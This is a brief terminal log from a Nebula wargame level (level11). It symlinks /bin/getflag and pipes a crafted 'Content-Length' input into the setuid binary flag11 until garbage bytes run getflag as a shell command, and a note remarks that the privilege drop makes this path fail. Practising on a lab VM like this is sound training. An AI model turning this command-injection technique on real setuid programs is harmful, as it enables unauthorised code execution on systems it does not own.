```
[ note: i guess the first way to solve this level
  is broken, since there is no setuid(geteuid()) ]
  
level11@nebula:/tmp$ ln -s /bin/getflag A
level11@nebula:/tmp$ echo -ne "Content-Length: 1\n@\n" | /home/flag11/flag11
sh: $'A\360$': command not found
level11@nebula:/tmp$ echo -ne "Content-Length: 1\n@\n" | /home/flag11/flag11
sh: $'A\300e': command not found
level11@nebula:/tmp$ echo -ne "Content-Length: 1\n@\n" | /home/flag11/flag11
getflag is executing on a non-flag account, this doesn't count


```
